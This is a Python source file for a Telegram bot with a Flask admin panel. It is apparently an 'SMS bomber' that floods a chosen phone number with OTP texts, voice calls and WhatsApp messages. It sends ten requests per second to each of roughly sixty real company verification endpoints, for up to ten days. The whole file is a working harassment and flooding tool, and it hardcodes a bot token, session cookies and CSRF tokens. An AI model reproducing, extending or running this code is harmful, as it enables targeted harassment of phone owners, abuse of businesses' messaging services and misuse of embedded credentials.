import logging
import asyncio
import os
import json
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import aiohttp
import urllib.parse
import time
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, send_file
import threading
import io

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot Token
BOT_TOKEN = "8914193378:AAGKto-OcLm4UBd998weqSI-Tf2nA9JMi5s"

# User sessions store
user_sessions = {}

# Timeout
TIMEOUT = 10

# ==================== API FILE ====================
API_FILE = "apis.json"

# ==================== ALL APIS (TERE SAARE APIS) ====================
def get_default_apis():
    return [
        # ===== RENDER CALL API =====
        {
            "name": "Call API Render",
            "url": "https://call-api-working.onrender.com/bomb/{phone}/50",
            "method": "GET",
            "headers": {"User-Agent": "Mozilla/5.0", "Accept": "application/json"},
            "data": None,
            "active": True
        },
        # ===== SCREENSHOT CONFIRMED =====
        {
            "name": "Tata Capital",
            "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}',
            "active": True
        },
        {
            "name": "MamaEarth",
            "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}"}',
            "active": True
        },
        {
            "name": "Redcliffe Labs",
            "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone_number":"{phone}","short":true}',
            "active": True
        },
        {
            "name": "DeHaat",
            "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","client_id":"kisan-app"}',
            "active": True
        },
        {
            "name": "Housing.com",
            "url": "https://login.housing.com/api/v2/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}","country_url_name":"in"}',
            "active": True
        },
        {
            "name": "Orange Health",
            "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile_number":"{phone}","customer_auto_fetch_message":true}',
            "active": True
        },
        {
            "name": "Brevistay",
            "url": "https://www.brevistay.com/cst/app-api/login",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"is_otp":1,"is_password":0,"mobile":"{phone}"}',
            "active": True
        },
        {
            "name": "Xylem",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","countryCode":"+91","firstName":"User"}',
            "active": True
        },
        {
            "name": "Physics Wallah",
            "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=1",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","countryCode":"+91"}',
            "active": True
        },
        {
            "name": "TradeIndia",
            "url": "https://apis.tradeindia.com/app_login_api/login_app",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"+91{phone}"}',
            "active": True
        },
        {
            "name": "Hourlyrooms",
            "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}"}',
            "active": True
        },
        {
            "name": "Hungama",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}',
            "active": True
        },
        {
            "name": "Freedo Rentals",
            "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"email_id":"user{phone}@temp.com","first_name":"User","mobile_number":"{phone}"}',
            "active": True
        },
        {
            "name": "Aakash",
            "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}',
            "active": True
        },
        {
            "name": "ApnaTime",
            "url": "https://api.apnatime.in/v1/auth/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}"}',
            "active": True
        },
        {
            "name": "Licious",
            "url": "https://www.licious.in/api/login/signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}","captcha_token":null}',
            "active": True
        },
        {
            "name": "Snapdeal",
            "url": "https://www.snapdeal.com/api/v1/user/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}"}',
            "active": True
        },
        {
            "name": "MY Bharat",
            "url": "https://mybharat.gov.in/api/v1/auth/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}"}',
            "active": True
        },
        {
            "name": "Swiggy Call",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}"}',
            "active": True
        },
        {
            "name": "Goibibo Voice",
            "url": "https://www.goibibo.com/user/voice-otp/generate/",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}"}',
            "active": True
        },
        {
            "name": "Airtel Thanks",
            "url": "https://www.airtel.in/api/v1/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}"}',
            "active": True
        },
        {
            "name": "KPN WhatsApp",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
            "method": "POST",
            "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}',
            "active": True
        },
        {
            "name": "Jockey WhatsApp",
            "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
            "method": "GET",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "data": None,
            "active": True
        },
        {
            "name": "NoBroker SMS",
            "url": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
            "data": "phone={phone}&countryCode=IN",
            "active": True
        },
        {
            "name": "Lenskart SMS",
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phoneCode":"+91","telephone":"{phone}"}',
            "active": True
        },
        {
            "name": "Byju's SMS",
            "url": "https://api.byjus.com/v2/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}"}',
            "active": True
        },
        {
            "name": "OYO SMS",
            "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
            "method": "POST",
            "headers": {"Content-Type": "text/plain;charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}","country_code":"+91","nod":4}',
            "active": True
        },
        {
            "name": "Breeze Session",
            "url": "https://api.breeze.in/session/start",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8", "User-Agent": "Mozilla/5.0"},
            "data": '{"phoneNumber":"{phone}","authVerificationType":"otp","device":{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"},"countryCode":"+91"}',
            "active": True
        },
        {
            "name": "Aditya Birla",
            "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": "MobileNumber={phone}&functionality=signup",
            "active": True
        },
        {
            "name": "Muthoot Finance",
            "url": "https://www.muthootfinance.com/smsapi.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": "mobile={phone}&pin=XjtYYEdhP0haXjo3",
            "active": True
        },
        {
            "name": "GoPaySense",
            "url": "https://api.gopaysense.com/users/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}"}',
            "active": True
        },
        {
            "name": "Dream11",
            "url": "https://www.dream11.com/auth/passwordless/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"channel":"sms","flow":"SIGNUP","phoneNumber":"{phone}","templateName":"default"}',
            "active": True
        },
        {
            "name": "Spinny",
            "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}',
            "active": True
        },
        {
            "name": "Rapido",
            "url": "https://customer.rapido.bike/api/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}"}',
            "active": True
        },
        {
            "name": "BetterHalf",
            "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","isd_code":"91"}',
            "active": True
        },
        {
            "name": "Charzer",
            "url": "https://api.charzer.com/auth-service/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","appSource":"CHARZER_APP"}',
            "active": True
        },
        {
            "name": "Mpokket",
            "url": "https://web-api.mpokket.in/registration/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}"}',
            "active": True
        },
        {
            "name": "ixigo",
            "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
            "method": "POST",
            "headers": {"apikey": "ixiweb\u00212$", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
            "data": "sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
            "active": True
        },
        {
            "name": "Zerodha",
            "url": "https://zerodha.com/account/registration.php",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","source":"zerodha","partner_id":""}',
            "active": True
        },
        {
            "name": "Testbook",
            "url": "https://api.testbook.com/api/v2/mobile/signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","signupDetails":{"page":"HomePage"}}',
            "active": True
        },
        {
            "name": "MediBuddy",
            "url": "https://loginprod.medibuddy.in/unified-login/user/register",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"{phone}","flow":"Retail-Login-Home-Flow"}',
            "active": True
        },
        {
            "name": "Udaan",
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": "mobile={phone}",
            "active": True
        },
        {
            "name": "Vidyakul",
            "url": "https://vidyakul.com/signup-otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": "phone={phone}",
            "active": True
        },
        {
            "name": "Beyoung",
            "url": "https://www.beyoung.in/api/sendOtp.json",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": '{"username":"{phone}","username_type":"mobile","service_type":0}',
            "active": True
        },
        {
            "name": "Wrogn",
            "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
            "method": "POST",
            "headers": {"action": "sendOTP", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"username":"+91{phone}","type":"mobile","domain":"wrogn.com"}',
            "active": True
        },
        {
            "name": "Medkart",
            "url": "https://app.medkart.in/api/v1/auth/requestOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile_no":"{phone}"}',
            "active": True
        },
        {
            "name": "Lovelocal",
            "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
            "method": "POST",
            "headers": {"client-code": "vulpix", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone_number":"{phone}","role":"CUSTOMER"}',
            "active": True
        },
        {
            "name": "Tyreplex",
            "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"},
            "data": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
            "active": True
        },
        {
            "name": "Citymall",
            "url": "https://citymall.live/api/cl-user/auth/get-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone_number":"{phone}"}',
            "active": True
        },
        {
            "name": "Pagarbook",
            "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone":"{phone}","language":1}',
            "active": True
        },
        {
            "name": "Rupee112",
            "url": "https://www.rupee112.com/login-sbm",
            "method": "POST",
            "headers": {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.rupee112.com", "Referer": "https://www.rupee112.com/apply-now?utm_source=GOOGLE", "Cookie": "WZRK_G=16739af4db4c404e9968318619ab60ad; ci_session=1vo2kv2vn4dv5sffc5c419cdh571s9dv", "User-Agent": "Mozilla/5.0"},
            "data": '{"mobile":"{phone}","current_page":"login","is_existing_customer":"2","device_id":"3c2f1fb977b9f389dc7e60f5f3fa9c44"}',
            "active": True
        },
        {
            "name": "Zomato",
            "url": "https://accounts.zomato.com/login/phone",
            "method": "POST",
            "headers": {"X-Requested-With": "mark.via.gp", "Origin": "https://accounts.zomato.com", "Referer": "https://accounts.zomato.com/zoauth/login?login_challenge=92531e7620c648ee8676220e0dfda19b", "Cookie": "csrf=d34a8614dc3898e9a3a9f7ebd4066f09; PHPSESSID=4c825266c5e7f2815ba9ce0b0b100408", "User-Agent": "Mozilla/5.0"},
            "data": '{"country_id":"1","number":"{phone}","type":"initiate","csrf_token":"d34a8614dc3898e9a3a9f7ebd4066f09","lc":"92531e7620c648ee8676220e0dfda19b","verification_type":"sms"}',
            "active": True
        },
        {
            "name": "Flipkart",
            "url": "https://2.rome.api.flipkart.com/1/action/view",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "X-Requested-With": "mark.via.gp", "Origin": "https://www.flipkart.com", "Referer": "https://www.flipkart.com/", "Cookie": "T=TI178341455549600002794507750234133411521128868489588945557157442381", "User-Agent": "Mozilla/5.0"},
            "data": '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE"}}',
            "active": True
        },
        {
            "name": "Shopsy",
            "url": "https://www.shopsy.in/2.rome/api/1/action/view",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "X-Requested-With": "mark.via.gp", "Origin": "https://www.shopsy.in", "Referer": "https://www.shopsy.in/login", "Cookie": "T=e06iz2zpaxj72xi9nkfw13c5-BR1783430686911", "User-Agent": "Mozilla/5.0"},
            "data": '{"actionRequestContext":{"loginIdPrefix":"+91","loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE"}}',
            "active": True
        },
        {
            "name": "KPNFresh",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "X-Requested-With": "mark.via.gp", "Origin": "https://www.kpnfresh.com", "Referer": "https://www.kpnfresh.com/", "User-Agent": "Mozilla/5.0"},
            "data": '{"phone_number":{"number":"{phone}","country_code":"+91"}}',
            "active": True
        },
        {
            "name": "IGP",
            "url": "https://www.igp.com/v2/loginSignup",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.igp.com", "Referer": "https://www.igp.com/", "User-Agent": "Mozilla/5.0"},
            "data": '{"mprefix":"91","mob":"{phone}","verifyOtp":false}',
            "active": True
        },
        {
            "name": "Gritzo WhatsApp",
            "url": "https://www.gritzo.com/veronica/user/validate/whatsapp/187/{phone}/signup",
            "method": "GET",
            "headers": {"X-Requested-With": "mark.via.gp", "Referer": "https://www.gritzo.com/", "User-Agent": "Mozilla/5.0"},
            "data": None,
            "active": True
        },
        {
            "name": "Gritzo SMS",
            "url": "https://www.gritzo.com/veronica/user/validate/187/{phone}/signup",
            "method": "GET",
            "headers": {"X-Requested-With": "mark.via.gp", "Referer": "https://www.gritzo.com/", "User-Agent": "Mozilla/5.0"},
            "data": None,
            "active": True
        }
    ]

# Load APIs from file or use default
def load_apis():
    try:
        if os.path.exists(API_FILE):
            with open(API_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    apis = get_default_apis()
    save_apis(apis)
    return apis

def save_apis(apis):
    with open(API_FILE, 'w') as f:
        json.dump(apis, f, indent=2)

# Load APIs
WORKING_APIS = load_apis()

# Duration options
DURATIONS = {
    "5 min": 300,
    "10 min": 600,
    "30 min": 1800,
    "1 hour": 3600,
    "4 hours": 14400,
    "24 hours": 86400,
    "10 days": 864000
}

# ==================== FLASK WEB SERVER ====================
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return render_template('index.html', apis=WORKING_APIS, total=len(WORKING_APIS))

@flask_app.route('/api/add', methods=['POST'])
def add_api():
    try:
        data = request.json
        new_api = {
            "name": data.get('name'),
            "url": data.get('url'),
            "method": data.get('method', 'POST'),
            "headers": data.get('headers', {}),
            "data": data.get('data'),
            "active": True
        }
        WORKING_APIS.append(new_api)
        save_apis(WORKING_APIS)
        return jsonify({"success": True, "message": "API added successfully!", "total": len(WORKING_APIS)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@flask_app.route('/api/delete/<int:index>', methods=['DELETE'])
def delete_api(index):
    try:
        if 0 <= index < len(WORKING_APIS):
            deleted = WORKING_APIS.pop(index)
            save_apis(WORKING_APIS)
            return jsonify({"success": True, "message": f"Deleted: {deleted.get('name')}", "total": len(WORKING_APIS)})
        return jsonify({"success": False, "error": "Invalid index"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@flask_app.route('/api/toggle/<int:index>', methods=['POST'])
def toggle_api(index):
    try:
        if 0 <= index < len(WORKING_APIS):
            WORKING_APIS[index]['active'] = not WORKING_APIS[index].get('active', True)
            save_apis(WORKING_APIS)
            return jsonify({"success": True, "active": WORKING_APIS[index]['active']})
        return jsonify({"success": False, "error": "Invalid index"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@flask_app.route('/api/download', methods=['GET'])
def download_apis():
    try:
        return jsonify({"apis": WORKING_APIS, "total": len(WORKING_APIS)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@flask_app.route('/api/export', methods=['GET'])
def export_apis():
    try:
        json_data = json.dumps(WORKING_APIS, indent=2)
        return send_file(
            io.BytesIO(json_data.encode()),
            mimetype='application/json',
            as_attachment=True,
            download_name=f'apis_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        )
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@flask_app.route('/api/import', methods=['POST'])
def import_apis():
    try:
        if 'file' not in request.files:
            return jsonify({"success": False, "error": "No file uploaded"})
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({"success": False, "error": "No file selected"})
        
        data = json.load(file)
        if isinstance(data, list):
            global WORKING_APIS
            WORKING_APIS = data
            save_apis(WORKING_APIS)
            return jsonify({"success": True, "message": f"Imported {len(data)} APIs", "total": len(WORKING_APIS)})
        return jsonify({"success": False, "error": "Invalid format"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@flask_app.route('/api/stats', methods=['GET'])
def get_stats():
    active = sum(1 for api in WORKING_APIS if api.get('active', True))
    return jsonify({
        "total": len(WORKING_APIS),
        "active": active,
        "inactive": len(WORKING_APIS) - active
    })

# ==================== TELEGRAM BOT FUNCTIONS ====================

def get_working_apis():
    return [api for api in WORKING_APIS if api.get('active', True)]

def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bombing")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    keyboard = [
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_duration_keyboard():
    keyboard = [
        [InlineKeyboardButton("⏱️ 5 min", callback_data="dur_300"), InlineKeyboardButton("⏱️ 10 min", callback_data="dur_600")],
        [InlineKeyboardButton("⏱️ 30 min", callback_data="dur_1800"), InlineKeyboardButton("⏱️ 1 hour", callback_data="dur_3600")],
        [InlineKeyboardButton("⏱️ 4 hours", callback_data="dur_14400"), InlineKeyboardButton("⏱️ 24 hours", callback_data="dur_86400")],
        [InlineKeyboardButton("⏱️ 10 days", callback_data="dur_864000")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_loop_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔁 CONTINUE BOMBING (Loop ON)", callback_data="loop_on")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 Show Status", callback_data="show_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def send_request(session: aiohttp.ClientSession, api: dict, phone: str):
    try:
        url = api["url"].replace("{phone}", phone)
        
        data = None
        if api.get("data"):
            if isinstance(api["data"], str):
                data = api["data"].replace("{phone}", phone)
        
        headers = api.get("headers", {})
        method = api.get("method", "POST").upper()
        
        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        async with session.request(
            method=method,
            url=url,
            data=data,
            headers=headers,
            timeout=TIMEOUT
        ) as resp:
            try:
                response_data = await resp.json()
            except:
                response_data = await resp.text()
            
            return {
                "name": api["name"],
                "status": resp.status,
                "success": resp.status in [200, 201, 202, 204],
                "response": response_data
            }
    except Exception as e:
        return {
            "name": api["name"],
            "status": 0,
            "success": False,
            "error": str(e)[:50]
        }

# [REST OF TELEGRAM BOT FUNCTIONS - SAME AS BEFORE]
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    active_apis = get_working_apis()
    
    welcome_text = (
        f"👋 Welcome {user.first_name}!\n\n"
        "🔰 *SUPER FAST BOMBING BOT*\n"
        "• Each API sends 10 requests per second\n"
        "• Auto-loop until you stop\n"
        "• Duration select karo\n\n"
        f"📊 *Total APIs: {len(active_apis)}*\n"
        f"⚡ *Speed: {len(active_apis)*10} requests/second*\n\n"
        "⚠️ *Use responsibly!*"
    )
    
    await update.message.reply_html(
        welcome_text,
        reply_markup=get_main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "start_bombing":
        user_sessions[user_id] = {"state": "selecting_duration"}
        await query.edit_message_text(
            "⏱️ *Select Duration:*\n\nChoose how long the bombing should run.\nSelect '10 days' for unlimited run!",
            parse_mode='Markdown',
            reply_markup=get_duration_keyboard()
        )
    
    elif data.startswith("dur_"):
        duration_secs = int(data.replace("dur_", ""))
        user_sessions[user_id] = {"state": "waiting_for_phone", "duration": duration_secs}
        duration_text = ""
        for name, secs in DURATIONS.items():
            if secs == duration_secs:
                duration_text = name
                break
        await query.edit_message_text(
            f"⏱️ *Duration Selected: {duration_text}*\n\n📱 *Please enter the phone number:*\n\nExample: `9122991582`\nOnly digits, no spaces!",
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )
    
    elif data == "stop_attack":
        if user_id in user_sessions:
            user_sessions[user_id]["should_stop"] = True
        await query.edit_message_text("🛑 *Attack Stopped!*", parse_mode='Markdown', reply_markup=get_main_keyboard())
    
    elif data == "help":
        active_apis = get_working_apis()
        help_text = (
            "📖 *Bot Help Guide*\n\n"
            "🚀 *Start Bombing:*\n1. Click 'Start Bombing'\n2. Select duration\n3. Enter phone number\n"
            f"⚡ *Speed:* {len(active_apis)} APIs × 10 = {len(active_apis)*10} req/sec\n\n"
            "⏱️ *Durations:* 5 min, 10 min, 30 min, 1 hour, 4 hours, 24 hours, 10 days"
        )
        await query.edit_message_text(help_text, parse_mode='Markdown', reply_markup=get_main_keyboard())
    
    elif data == "cancel":
        if user_id in user_sessions:
            user_sessions[user_id] = {}
        await query.edit_message_text("❌ *Cancelled*", parse_mode='Markdown', reply_markup=get_main_keyboard())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_text = update.message.text
    
    if user_id in user_sessions and user_sessions[user_id].get("state") == "waiting_for_phone":
        if message_text.isdigit() and len(message_text) >= 10:
            phone = message_text
            duration = user_sessions[user_id].get("duration", 300)
            await start_bombing_flow(update, context, user_id, phone, duration)
        else:
            await update.message.reply_text("❌ *Invalid phone number!*", parse_mode='Markdown', reply_markup=get_cancel_keyboard())
    else:
        await update.message.reply_text("Use buttons below:", reply_markup=get_main_keyboard())

async def start_bombing_flow(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, phone: str, duration: int):
    duration_text = ""
    for name, secs in DURATIONS.items():
        if secs == duration:
            duration_text = name
            break
    
    user_sessions[user_id] = {
        "phone": phone,
        "duration": duration,
        "should_stop": False,
        "state": "attacking",
        "start_time": time.time(),
        "total_requests": 0,
        "success_count": 0,
        "failed_count": 0,
        "loop_count": 0
    }
    
    active_apis = get_working_apis()
    status_message = await update.message.reply_text(
        f"🚀 *Starting SUPER FAST Bombing!*\n\n📱 Target: `{phone}`\n⏱️ Duration: {duration_text}\n📊 APIs: {len(active_apis)}\n⚡ Speed: {len(active_apis)*10} req/sec\n\n⚡ *Attack in progress...*",
        parse_mode='Markdown',
        reply_markup=get_loop_keyboard()
    )
    
    user_sessions[user_id]["status_message"] = status_message
    attack_task = asyncio.create_task(run_super_fast_bomb_attack(user_id, phone, duration, status_message, context))
    user_sessions[user_id]["attack_task"] = attack_task

async def run_super_fast_bomb_attack(user_id: int, phone: str, duration: int, status_message, context: ContextTypes.DEFAULT_TYPE):
    start_time = time.time()
    end_time = start_time + duration if duration > 0 else float('inf')
    
    stop_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")]
    ])
    
    async with aiohttp.ClientSession() as session:
        while True:
            active_apis = get_working_apis()
            if not active_apis:
                await context.bot.edit_message_text("⚠️ *No active APIs!*", parse_mode='Markdown', chat_id=status_message.chat_id, message_id=status_message.message_id, reply_markup=get_main_keyboard())
                break
            
            if user_id not in user_sessions or user_sessions[user_id].get("should_stop", False):
                break
            
            if time.time() >= end_time:
                break
            
            user_sessions[user_id]["loop_count"] = user_sessions[user_id].get("loop_count", 0) + 1
            
            tasks = []
            for api in active_apis:
                for _ in range(10):
                    if user_id in user_sessions and user_sessions[user_id].get("should_stop", False):
                        break
                    tasks.append(asyncio.create_task(send_request(session, api, phone)))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success = user_sessions[user_id].get("success_count", 0)
                failed = user_sessions[user_id].get("failed_count", 0)
                total = user_sessions[user_id].get("total_requests", 0)
                
                for r in results:
                    if isinstance(r, dict) and r.get("success", False):
                        success += 1
                    else:
                        failed += 1
                total += len(tasks)
                
                user_sessions[user_id]["total_requests"] = total
                user_sessions[user_id]["success_count"] = success
                user_sessions[user_id]["failed_count"] = failed
            
            await asyncio.sleep(1)
    
